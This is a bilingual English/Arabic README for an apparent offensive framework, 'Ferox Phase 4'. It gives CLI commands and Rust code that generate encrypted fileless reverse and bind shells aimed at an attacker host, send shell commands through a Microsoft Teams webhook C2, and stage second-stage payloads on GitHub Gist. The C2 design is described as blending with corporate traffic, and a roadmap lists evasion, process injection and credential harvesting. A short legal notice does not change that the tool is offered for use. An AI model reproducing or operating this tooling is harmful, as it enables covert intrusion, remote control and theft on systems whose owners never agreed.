# 🚀 Ferox Phase 4 - Smart Payload System + Cloud-Native C2

<div dir="rtl">

# نظام الحمولات الذكي + القيادة والتحكم السحابية

</div>

---

## 📋 Table of Contents | جدول المحتويات

- [English Documentation](#english-documentation)
- [التوثيق العربي](#arabic-documentation)

---

## English Documentation

### 🎯 Overview

Ferox Phase 4 represents the evolution from reconnaissance framework to **full offensive security platform** with:

- **Smart Payload Engine**: Generate encrypted, fileless payloads
- **Multi-Stage Architecture**: Advanced stagers with Stage-2 delivery
- **Cloud-Native C2**: Microsoft Teams & GitHub Gist integration
- **Military-Grade Encryption**: AES-256-GCM with HKDF key derivation
- **Cross-Platform**: Windows, Linux, macOS, Universal support
- **Memory-Only Execution**: Fileless attacks that leave no disk traces

### ⚡ Key Features

#### 🔐 Security & Encryption
- **AES-256-GCM** encryption for all payloads
- **HKDF** key derivation from master keys
- **Randomized nonces** for each encryption operation
- **Base64 encoding** for transport

#### 🎯 Payload Capabilities
- **Reverse TCP shells** with fileless execution
- **Bind shells** for direct access
- **Multi-stage stagers** for advanced delivery
- **Custom shellcode** support
- **OS-specific optimizations**

#### 📡 C2 Channels
- **Microsoft Teams Webhook** - Blends with corporate traffic
- **GitHub Gist** - Covert payload delivery via trusted platform
- **DNS-over-HTTPS** (planned)
- **Custom protocols** (extensible)

### 🏗️ Architecture

```
┌─────────────────────────────────────────────┐
│          Ferox Phase 4 Architecture         │
├─────────────────────────────────────────────┤
│                                             │
│  ┌──────────────────────────────────────┐  │
│  │      Payload Engine (Core)           │  │
│  │  • AES-256-GCM Encryption            │  │
│  │  • HKDF Key Derivation               │  │
│  │  • Multi-Platform Generation         │  │
│  └──────────────────────────────────────┘  │
│                   │                         │
│     ┌─────────────┴─────────────┐          │
│     │                           │          │
│  ┌──▼──────────┐      ┌────────▼───────┐  │
│  │  Payloads   │      │   C2 Channels  │  │
│  │             │      │                │  │
│  │ • Rev TCP   │      │ • Teams        │  │
│  │ • Bind      │      │ • GitHub Gist  │  │
│  │ • Stagers   │      │ • DNS-over-H   │  │
│  └─────────────┘      └────────────────┘  │
│                                             │
│  ┌──────────────────────────────────────┐  │
│  │       Module Registry                │  │
│  │  • Organized module management       │  │
│  │  • Dynamic loading & discovery       │  │
│  └──────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
```

### 📦 Installation

#### Prerequisites
```bash
# Rust toolchain (1.70+)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Required system packages
sudo apt update
sudo apt install build-essential pkg-config libssl-dev
```

#### Build from Source
```bash
# Clone the repository
git clone https://github.com/ferox-security/ferox.git
cd ferox/phase4

# Build release version
cargo build --release

# Run tests
cargo test

# Install globally
cargo install --path .
```

### 🚀 Quick Start

#### 1. List Available Modules
```bash
ferox list
ferox list --type-filter payload
ferox list --type-filter c2
```

#### 2. View Module Details
```bash
ferox info payloads/fileless/reverse_tcp
ferox info c2/teams_tunnel
```

#### 3. Generate Payload
```bash
# Basic reverse TCP payload
ferox payload -H 192.168.1.100 -P 4444 -O windows

# With C2 channel
ferox payload -H 192.168.1.100 -P 4444 -O linux \
  --c2 https://c2.example.com/stage2

# Save to file
ferox payload -H 192.168.1.100 -P 4444 -O macos \
  --output payload.txt
```

#### 4. Module Statistics
```bash
ferox stats
```

### 💻 Programmatic Usage

#### Basic Payload Generation
```rust
use ferox_phase4::core::payload_engine::{PayloadEngine, TargetOS};
use ferox_phase4::modules::payloads::rev_tcp_fileless::{
    FilelessReverseTcp, ReverseTcpConfig
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create module
    let module = FilelessReverseTcp::new()?;
    
    // Configure
    let config = ReverseTcpConfig {
        lhost: "192.168.1.100".to_string(),
        lport: 4444,
        target_os: TargetOS::Windows,
        encrypt: true,
        c2_channel: None,
    };
    
    // Generate
    let result = module.execute(config)?;
    result.display();
    
    // Save
    result.save_to_file("output.txt")?;
    
    Ok(())
}
```

#### Teams C2 Integration
```rust
use ferox_phase4::modules::c2::teams_tunnel::{
    TeamsTunnel, CommandBuilder, CommandType
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create tunnel
    let webhook = "https://outlook.office.com/webhook/YOUR_WEBHOOK";
    let key = b"your_32_byte_encryption_key_here";
    let tunnel = TeamsTunnel::new(webhook, key)?;
    
    // Create command
    let command = CommandBuilder::new(CommandType::Shell)
        .payload("whoami")
        .target("target-01")
        .build();
    
    // Send command
    tunnel.send_command(&command).await?;
    
    // Send result
    tunnel.send_result(&command.command_id, "output", true).await?;
    
    Ok(())
}
```

#### GitHub Gist C2
```rust
use ferox_phase4::modules::c2::github_gist_loader::{
    GistLoader, GistC2Builder
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create loader
    let mut loader = GistC2Builder::new()
        .api_token("ghp_YOUR_GITHUB_TOKEN")
        .encryption_key(b"your_32_byte_key_here_12345678")
        .build()?;
    
    // Create gist with payload
    let gist = loader.create_gist(
        "Ferox Payload",
        "stage2.txt",
        "payload_content_here",
        false
    ).await?;
    
    println!("Gist URL: {}", gist.html_url);
    
    Ok(())
}
```

### 🔧 Configuration

#### Environment Variables
```bash
# Teams webhook URL
export TEAMS_WEBHOOK_URL="https://outlook.office.com/webhook/..."

# GitHub API token
export GITHUB_TOKEN="ghp_..."

# Enable debug logging
export RUST_LOG=debug
```

#### Custom Encryption Keys
```rust
// Generate strong encryption key
use rand::RngCore;
let mut key = vec![0u8; 32];
rand::thread_rng().fill_bytes(&mut key);

// Use with payload engine
let engine = PayloadEngine::new(&key)?;
```

### 📊 Module System

#### Available Module Types
- **Payload**: Executable payloads (shells, stagers)
- **C2**: Command & Control channels
- **Exploit**: Vulnerability exploits (future)
- **PostExploitation**: Post-compromise tools (future)
- **Auxiliary**: Helper modules (future)

#### Registering Custom Modules
```rust
use ferox_phase4::modules::{ModuleRegistry, ModuleInfo, ModuleType};

let mut registry = ModuleRegistry::new();

registry.register(ModuleInfo {
    name: "custom/my_module".to_string(),
    module_type: ModuleType::Payload,
    description: "My custom module".to_string(),
    author: "Your Name".to_string(),
    version: "1.0.0".to_string(),
    references: vec![],
    platforms: vec!["Windows".to_string()],
});
```

### 🛡️ Security Best Practices

1. **Always use encryption** - Never send payloads in plaintext
2. **Rotate keys regularly** - Change encryption keys between operations
3. **Test in isolation** - Use VMs/sandboxes for development
4. **Obtain authorization** - Written permission before any testing
5. **Secure storage** - Protect generated payloads and keys
6. **Clean up artifacts** - Remove all traces after authorized testing

### ⚠️ Legal Notice

```
WARNING: This tool is for AUTHORIZED security testing ONLY.

✓ DO:
  - Obtain written authorization before testing
  - Use only on systems you own or have permission to test
  - Follow all applicable laws and regulations
  - Document all activities
  - Report findings responsibly

✗ DON'T:
  - Use on systems without authorization
  - Deploy malicious payloads
  - Cause damage or disruption
  - Access private data without permission
  - Violate terms of service
```

### 📚 Advanced Topics

#### Multi-Stage Attack Chain
```rust
// Stage 1: Initial stager
let stager = engine.generate_fileless_stager(
    "https://gist.github.com/stage2",
    TargetOS::Windows
)?;

// Stage 2: Full payload (delivered via C2)
let payload = engine.generate_reverse_tcp(
    "192.168.1.100",
    4444,
    TargetOS::Windows
)?;

// Upload Stage 2 to Gist
let url = gist_loader.upload_payload("stage2", &payload.encrypted).await?;
```

#### Custom Shellcode
```rust
// Your custom shellcode
let custom_shellcode: Vec<u8> = vec![/* ... */];

// Encrypt and package
let encrypted = engine.encrypt_payload(&custom_shellcode)?;
let base64 = base64::encode(&encrypted);
```

### 🧪 Testing

```bash
# Run all tests
cargo test

# Run specific test
cargo test test_engine_creation

# Run with output
cargo test -- --nocapture

# Run integration tests
cargo test --test '*'
```

### 📈 Roadmap

- [x] Phase 4.0: Smart Payload System
- [x] Phase 4.0: Teams & Gist C2
- [ ] Phase 4.1: DNS-over-HTTPS C2
- [ ] Phase 4.2: Memory forensics evasion
- [ ] Phase 4.3: Process injection modules
- [ ] Phase 4.4: Credential harvesting
- [ ] Phase 4.5: Persistence mechanisms

### 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### 📄 License

MIT License - See [LICENSE](LICENSE) for details.

---

<div dir="rtl">

## التوثيق العربي

### 🎯 نظرة عامة

تمثل المرحلة الرابعة من فيروكس تطورًا من إطار الاستطلاع إلى **منصة أمنية هجومية كاملة** مع:

- **محرك الحمولات الذكي**: توليد حمولات مشفرة بدون ملفات
- **بنية متعددة المراحل**: برامج تحميل متقدمة مع توصيل المرحلة الثانية
- **C2 سحابي أصلي**: تكامل Microsoft Teams و GitHub Gist
- **تشفير عسكري**: AES-256-GCM مع اشتقاق مفتاح HKDF
- **متعدد المنصات**: دعم Windows و Linux و macOS
- **تنفيذ في الذاكرة فقط**: هجمات بدون ملفات لا تترك أثرًا

### ⚡ الميزات الرئيسية

#### 🔐 الأمان والتشفير
- تشفير **AES-256-GCM** لجميع الحمولات
- اشتقاق مفتاح **HKDF** من المفاتيح الرئيسية
- **أرقام عشوائية** لكل عملية تشفير
- **ترميز Base64** للنقل

#### 🎯 قدرات الحمولة
- **أصداف TCP عكسية** مع تنفيذ بدون ملفات
- **أصداف ربط** للوصول المباشر
- **برامج تحميل متعددة المراحل** للتوصيل المتقدم
- دعم **الأكواد المخصصة**
- **تحسينات خاصة بنظام التشغيل**

#### 📡 قنوات C2
- **Microsoft Teams Webhook** - يمتزج مع حركة الشركات
- **GitHub Gist** - توصيل سري عبر منصة موثوقة
- **DNS-over-HTTPS** (مخطط)
- **بروتوكولات مخصصة** (قابل للتوسع)

### 📦 التثبيت

#### المتطلبات الأساسية
```bash
# سلسلة أدوات Rust (1.70+)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# الحزم المطلوبة
sudo apt update
sudo apt install build-essential pkg-config libssl-dev
```

#### البناء من المصدر
```bash
# استنساخ المستودع
git clone https://github.com/ferox-security/ferox.git
cd ferox/phase4

# بناء نسخة الإصدار
cargo build --release

# تشغيل الاختبارات
cargo test

# التثبيت عالميًا
cargo install --path .
```

### 🚀 البدء السريع

#### 1. عرض الوحدات المتاحة
```bash
ferox list
ferox list --type-filter payload
ferox list --type-filter c2
```

#### 2. عرض تفاصيل الوحدة
```bash
ferox info payloads/fileless/reverse_tcp
ferox info c2/teams_tunnel
```

#### 3. توليد حمولة
```bash
# حمولة TCP عكسية أساسية
ferox payload -H 192.168.1.100 -P 4444 -O windows

# مع قناة C2
ferox payload -H 192.168.1.100 -P 4444 -O linux \
  --c2 https://c2.example.com/stage2

# الحفظ في ملف
ferox payload -H 192.168.1.100 -P 4444 -O macos \
  --output payload.txt
```

### 🛡️ أفضل ممارسات الأمان

1. **استخدم التشفير دائمًا** - لا ترسل الحمولات بنص عادي
2. **قم بتدوير المفاتيح بانتظام** - غيّر مفاتيح التشفير بين العمليات
3. **الاختبار في عزلة** - استخدم الأجهزة الافتراضية للتطوير
4. **احصل على الترخيص** - إذن كتابي قبل أي اختبار
5. **التخزين الآمن** - احمِ الحمولات والمفاتيح المُولدة
6. **تنظيف الآثار** - أزل جميع الآثار بعد الاختبار المُصرح به

### ⚠️ إشعار قانوني

```
تحذير: هذه الأداة للاختبار الأمني المُصرح به فقط.

✓ افعل:
  - احصل على ترخيص كتابي قبل الاختبار
  - استخدمها فقط على الأنظمة التي تمتلكها أو لديك إذن باختبارها
  - اتبع جميع القوانين واللوائح المعمول بها
  - وثّق جميع الأنشطة
  - أبلغ عن النتائج بمسؤولية

✗ لا تفعل:
  - استخدامها على أنظمة بدون ترخيص
  - نشر حمولات ضارة
  - التسبب في ضرر أو تعطيل
  - الوصول إلى بيانات خاصة بدون إذن
  - انتهاك شروط الخدمة
```

### 📞 الدعم والاتصال

- **الموقع الإلكتروني**: https://ferox.dev
- **المستودع**: https://github.com/ferox-security/ferox
- **البريد الإلكتروني**: security@ferox.dev
- **المشاكل**: https://github.com/ferox-security/ferox/issues

### 👥 المساهمون

شكرًا لجميع المساهمين في مشروع فيروكس!

### 📄 الترخيص

ترخيص MIT - انظر [LICENSE](LICENSE) للتفاصيل.

</div>

---

**Made with ❤️ by the Ferox Security Team**

**صُنع بـ ❤️ من قبل فريق فيروكس الأمني**
